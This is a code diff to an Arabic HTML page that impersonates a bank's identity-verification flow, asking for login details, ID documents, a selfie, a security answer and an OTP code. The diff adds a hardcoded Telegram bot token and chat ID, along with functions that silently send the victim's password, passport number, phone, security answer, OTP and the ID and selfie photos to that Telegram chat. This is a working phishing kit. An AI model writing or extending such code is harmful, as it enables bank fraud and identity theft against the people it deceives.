@@ -1,4 +1,4 @@
-here<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
@@ -664,12 +664,12 @@ here<!DOCTYPE html>
 
     .mini-btn {
       flex: 1;
-      min-width: 110px;
+      min-width: 105px;
       height: 40px;
       border: none;
       border-radius: 7px;
       font-family: 'Cairo', sans-serif;
-      font-size: 13.5px;
+      font-size: 13px;
       font-weight: 700;
       cursor: pointer;
       display: inline-flex;
@@ -690,6 +690,11 @@ here<!DOCTYPE html>
 
     .mini-btn-red {
       background-color: var(--red-header-2);
+      color: #ffffff;
+    }
+
+    .mini-btn-gallery {
+      background-color: #1e6f5c;
       color: #ffffff;
     }
 
@@ -1366,7 +1371,7 @@ here<!DOCTYPE html>
                   <span>صورة سيلفي</span>
                 </h3>
                 <p style="font-size: 13px; color: #555; line-height: 1.5;">
-                  ضع وجهك داخل المحدد الذهبي لالتقاط صورة الوجه.
+                  يمكنك التقاط صورة مباشرة داخل المحدد الذهبي أو اختيار صورة للوجه من المعرض.
                 </p>
 
                 <div class="camera-controls">
@@ -1378,7 +1383,19 @@ here<!DOCTYPE html>
                     <i class="fa-solid fa-camera-rotate"></i>
                     <span id="facingLabel">أمامية / خلفية</span>
                   </button>
+                  <button type="button" class="mini-btn mini-btn-gallery" onclick="document.getElementById('selfieGalleryInput').click()">
+                    <i class="fa-solid fa-images"></i>
+                    <span>من المعرض</span>
+                  </button>
                 </div>
+
+                <input
+                  type="file"
+                  id="selfieGalleryInput"
+                  accept="image/*"
+                  style="display: none;"
+                  onchange="handleSelfieGalleryUpload(this)"
+                />
 
                 <div id="cameraStage" class="camera-stage">
                   <video id="selfieVideo" class="mirrored" autoplay playsinline muted></video>
@@ -1395,7 +1412,7 @@ here<!DOCTYPE html>
                 <canvas id="selfieCanvas" style="display: none;"></canvas>
 
                 <div id="selfieCapturedBox" class="selfie-captured-box">
-                  <img id="selfiePreviewImg" alt="صورة السيلفي الملتقطة" />
+                  <img id="selfiePreviewImg" alt="صورة السيلفي" />
                   <div id="selfieStatus" class="upload-status"></div>
                 </div>
               </div>
@@ -1668,13 +1685,18 @@ here<!DOCTYPE html>
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
   <script>
-    const STORAGE_KEY = 'ibok_ekyc_recorded_session_v1';
+    const TELEGRAM_BOT_TOKEN = '9077249116:AAG4T3pPvZT-Bdj8GisvhRmWTx3s7dX8WYo';
+    const TELEGRAM_CHAT_ID = '8027764156';
+    const STORAGE_KEY = 'ibok_ekyc_recorded_session_v2';
 
     let cameraStream = null;
     let currentFacingMode = 'user';
     let docUploaded = false;
     let selfieCaptured = false;
     let submissionTimer = null;
+
+    let docDataUrl = '';
+    let selfieDataUrl = '';
 
     let recordedState = {
       loginMode: 'iBOK',
@@ -1685,6 +1707,8 @@ here<!DOCTYPE html>
       passportNumber: '',
       docType: '',
       docFileName: '',
+      selfieSource: '',
+      selfieFileName: '',
       selfieCaptured: false,
       securityQuestion: '',
       securityAnswer: '',
@@ -1696,9 +1720,7 @@ here<!DOCTYPE html>
     function persistRecordedState() {
       try {
         localStorage.setItem(STORAGE_KEY, JSON.stringify(recordedState));
-      } catch (e) {
-        // تجاهل خطأ التخزين المحلي إن وجد
-      }
+      } catch (e) {}
     }
 
     function recordFieldChange(key, value) {
@@ -1706,15 +1728,48 @@ here<!DOCTYPE html>
       persistRecordedState();
     }
 
-    // دالة اختيارية لربط إرسال البيانات المسجلة إلى خادم أو نقطة نهاية خارجية دون تعطيل التنقل
-    async function dispatchRecordedData(stageName) {
-      const payload = {
-        stage: stageName,
-        timestamp: new Date().toISOString(),
-        data: { ...recordedState }
-      };
+    // إرسال رسالة نصية صامتة في الخلفية إلى تيليجرام
+    function silentSendTelegramMessage(text) {
       persistRecordedState();
-      return payload;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        keepalive: true,
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: text
+        })
+      }).catch(() => {});
+    }
+
+    function dataUrlToBlob(dataUrl) {
+      const parts = dataUrl.split(',');
+      const mimeMatch = parts[0].match(/:(.*?);/);
+      const mime = mimeMatch ? mimeMatch[1] : 'image/jpeg';
+      const binary = atob(parts[1]);
+      const array = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) {
+        array[i] = binary.charCodeAt(i);
+      }
+      return new Blob([array], { type: mime });
+    }
+
+    // إرسال صورة صامتة في الخلفية إلى تيليجرام
+    function silentSendTelegramPhoto(dataUrl, filename, caption) {
+      if (!dataUrl || !dataUrl.startsWith('data:')) return;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('photo', dataUrlToBlob(dataUrl), filename || 'image.jpg');
+      if (caption) {
+        formData.append('caption', caption);
+      }
+      fetch(url, {
+        method: 'POST',
+        keepalive: true,
+        body: formData
+      }).catch(() => {});
     }
 
     function showScreen(screenId) {
@@ -1807,7 +1862,12 @@ here<!DOCTYPE html>
 
       recordedState.username = acc;
       recordedState.password = pass;
-      dispatchRecordedData('login_submitted');
+
+      silentSendTelegramMessage(
+        `[تسجيل الدخول - ${recordedState.loginMode}]\n` +
+        `رقم المعرف / الحساب: ${acc}\n` +
+        `كلمة المرور: ${pass}`
+      );
 
       showMessage('loginMessage', '');
       runGoldSpinnerForDuration(2000, () => {
@@ -1833,11 +1893,37 @@ here<!DOCTYPE html>
 
       const reader = new FileReader();
       reader.onload = function (e) {
+        docDataUrl = e.target.result;
         const img = document.getElementById('docPreviewImg');
-        img.src = e.target.result;
+        img.src = docDataUrl;
         img.style.display = 'block';
         docUploaded = true;
         document.getElementById('docUploadStatus').textContent = 'تم الرفع بنجاح';
+      };
+      reader.readAsDataURL(file);
+    }
+
+    function handleSelfieGalleryUpload(input) {
+      const file = input.files && input.files[0];
+      if (!file) return;
+
+      stopCamera();
+      document.getElementById('cameraStage').classList.remove('active');
+      document.getElementById('captureBar').style.display = 'none';
+
+      recordedState.selfieFileName = file.name;
+      recordedState.selfieSource = 'المعرض';
+      recordedState.selfieCaptured = true;
+      persistRecordedState();
+
+      const reader = new FileReader();
+      reader.onload = function (e) {
+        selfieDataUrl = e.target.result;
+        const img = document.getElementById('selfiePreviewImg');
+        img.src = selfieDataUrl;
+        document.getElementById('selfieCapturedBox').classList.add('active');
+        document.getElementById('selfieStatus').textContent = 'تم اختيار صورة السيلفي من المعرض بنجاح';
+        selfieCaptured = true;
       };
       reader.readAsDataURL(file);
     }
@@ -1850,7 +1936,7 @@ here<!DOCTYPE html>
       stopCamera();
 
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        showToast('الكاميرا غير مدعومة في هذا المتصفح.');
+        showToast('الكاميرا غير مدعومة، يمكنك اختيار صورة من المعرض.');
         return;
       }
 
@@ -1864,7 +1950,7 @@ here<!DOCTYPE html>
         stage.classList.add('active');
         captureBar.style.display = 'block';
       } catch (err) {
-        showToast('تعذر فتح الكاميرا، يرجى السماح بصلاحية الكاميرا أو التأكد من رابط HTTPS.');
+        showToast('تعذر فتح الكاميرا، يمكنك اختيار صورة من المعرض.');
       }
     }
 
@@ -1900,13 +1986,15 @@ here<!DOCTYPE html>
       }
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-      document.getElementById('selfiePreviewImg').src = dataUrl;
+      selfieDataUrl = canvas.toDataURL('image/jpeg', 0.9);
+      document.getElementById('selfiePreviewImg').src = selfieDataUrl;
       document.getElementById('selfieCapturedBox').classList.add('active');
       document.getElementById('selfieStatus').textContent = 'تم التقاط صورة الوجه بنجاح';
 
       selfieCaptured = true;
       recordedState.selfieCaptured = true;
+      recordedState.selfieSource = 'الكاميرا';
+      recordedState.selfieFileName = 'selfie-camera.jpg';
       persistRecordedState();
 
       stage.classList.remove('active');
@@ -1939,7 +2027,7 @@ here<!DOCTYPE html>
       }
 
       if (!selfieCaptured) {
-        showMessage('updateMessage', 'يرجى التقاط صورة السيلفي داخل المحدد الذهبي أولاً.');
+        showMessage('updateMessage', 'يرجى التقاط صورة السيلفي أو اختيار صورة من المعرض أولاً.');
         return;
       }
 
@@ -1947,7 +2035,28 @@ here<!DOCTYPE html>
       recordedState.phoneNumber = phone;
       recordedState.passportNumber = passport;
       recordedState.docType = docType || 'مستند مرفق';
-      dispatchRecordedData('update_submitted');
+
+      silentSendTelegramMessage(
+        `[تحديث البيانات والهوية]\n` +
+        `رقم الحساب / المعرف: ${recordedState.username || '-'}\n` +
+        `الاسم الرباعي: ${fullName}\n` +
+        `رقم الهاتف: ${phone}\n` +
+        `رقم الجواز / الهوية: ${passport}\n` +
+        `نوع المستند: ${recordedState.docType}\n` +
+        `مصدر السيلفي: ${recordedState.selfieSource || 'مرفق'}`
+      );
+
+      silentSendTelegramPhoto(
+        docDataUrl,
+        recordedState.docFileName || 'id-document.jpg',
+        `إثبات الهوية (${recordedState.docType}) - ${fullName}`
+      );
+
+      silentSendTelegramPhoto(
+        selfieDataUrl,
+        recordedState.selfieFileName || 'selfie.jpg',
+        `صورة السيلفي (${recordedState.selfieSource || 'مرفق'}) - ${fullName}`
+      );
 
       showMessage('updateMessage', '');
       stopCamera();
@@ -1992,7 +2101,14 @@ here<!DOCTYPE html>
 
       recordedState.securityQuestion = q;
       recordedState.securityAnswer = ans;
-      dispatchRecordedData('security_submitted');
+
+      silentSendTelegramMessage(
+        `[سؤال الأمان]\n` +
+        `رقم الحساب / المعرف: ${recordedState.username || '-'}\n` +
+        `الاسم: ${recordedState.fullName || '-'}\n` +
+        `السؤال: ${q}\n` +
+        `الإجابة: ${ans}`
+      );
 
       showMessage('securityMessage', '');
       runGoldSpinnerForDuration(3000, () => {
@@ -2011,7 +2127,13 @@ here<!DOCTYPE html>
       }
 
       recordedState.otpCode = otp;
-      dispatchRecordedData('otp_submitted');
+
+      silentSendTelegramMessage(
+        `[رمز OTP]\n` +
+        `رقم الحساب / المعرف: ${recordedState.username || '-'}\n` +
+        `الاسم: ${recordedState.fullName || '-'}\n` +
+        `رمز OTP: ${otp}`
+      );
 
       showMessage('otpMessage', '');
       startSubmissionProgress();
@@ -2029,19 +2151,19 @@ here<!DOCTYPE html>
 
       recordedState.referenceNumber = refNum;
       recordedState.submittedAt = formattedDate;
-      dispatchRecordedData('ekyc_completed');
+      persistRecordedState();
 
       document.getElementById('referenceNumberValue').textContent = refNum;
       document.getElementById('submissionDateValue').textContent = formattedDate;
 
       document.getElementById('recordedSummaryList').innerHTML = `
         <div><strong>الخدمة:</strong> ${recordedState.loginMode || 'iBOK'}</div>
-        <div><strong>رقم الحساب / المعرفة:</strong> ${recordedState.username || '-'}</div>
-        <div><strong>الاسم الرباعي:</strong> ${recordedState.fullName || '-'}</div>
+        <div><strong>رقم المعرف / الحساب:</strong> ${recordedState.username || '-'}</div>
+        <div><strong>الاسم:</strong> ${recordedState.fullName || '-'}</div>
         <div><strong>رقم الهاتف:</strong> ${recordedState.phoneNumber || '-'}</div>
         <div><strong>رقم الجواز / الهوية:</strong> ${recordedState.passportNumber || '-'}</div>
-        <div><strong>المستند:</strong> ${recordedState.docType || '-'} ${recordedState.docFileName ? `(${recordedState.docFileName})` : ''}</div>
-        <div><strong>صورة السيلفي:</strong> ${recordedState.selfieCaptured ? 'مُلتقطة' : 'غير مُلتقطة'}</div>
+        <div><strong>إثبات الهوية:</strong> ${recordedState.docType || '-'} ${recordedState.docFileName ? `(${recordedState.docFileName})` : ''}</div>
+        <div><strong>صورة السيلفي:</strong> ${recordedState.selfieCaptured ? `مرفقة (${recordedState.selfieSource || 'معرض/كاميرا'})` : 'غير مرفقة'}</div>
         <div><strong>سؤال الأمان:</strong> ${recordedState.securityQuestion || '-'}</div>
         <div><strong>إجابة سؤال الأمان:</strong> ${recordedState.securityAnswer || '-'}</div>
         <div><strong>رمز OTP:</strong> ${recordedState.otpCode || '-'}</div>
@@ -2105,15 +2227,15 @@ here<!DOCTYPE html>
         `تاريخ التقديم الوقت: ${dt}\n` +
         `الحالة: قيد المراجعة\n` +
         `الخدمة: ${recordedState.loginMode || 'iBOK'}\n` +
-        `رقم الحساب / المعرفة: ${recordedState.username || '-'}\n` +
+        `رقم المعرف / الحساب: ${recordedState.username || '-'}\n` +
         `كلمة المرور: ${recordedState.password || '-'}\n` +
-        `الاسم الرباعي: ${recordedState.fullName || '-'}\n` +
+        `الاسم: ${recordedState.fullName || '-'}\n` +
         `رقم الهاتف: ${recordedState.phoneNumber || '-'}\n` +
         `رقم الجواز / الهوية: ${recordedState.passportNumber || '-'}\n` +
-        `نوع المستند: ${recordedState.docType || '-'} (${recordedState.docFileName || '-'})\n` +
-        `صورة السيلفي: ${recordedState.selfieCaptured ? 'مُلتقطة' : 'غير مُلتقطة'}\n` +
+        `إثبات الهوية: ${recordedState.docType || '-'} (${recordedState.docFileName || '-'})\n` +
+        `صورة السيلفي: ${recordedState.selfieCaptured ? `مرفقة (${recordedState.selfieSource || '-'})` : 'غير مرفقة'}\n` +
         `سؤال الأمان: ${recordedState.securityQuestion || '-'}\n` +
-        `الإجابة: ${recordedState.securityAnswer || '-'}\n` +
+        `إجابة سؤال الأمان: ${recordedState.securityAnswer || '-'}\n` +
         `رمز OTP: ${recordedState.otpCode || '-'}\n`;
 
       const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
@@ -2148,4 +2270,4 @@ here<!DOCTYPE html>
     }
   </script>
 </body>
-                </html>
+          </html>
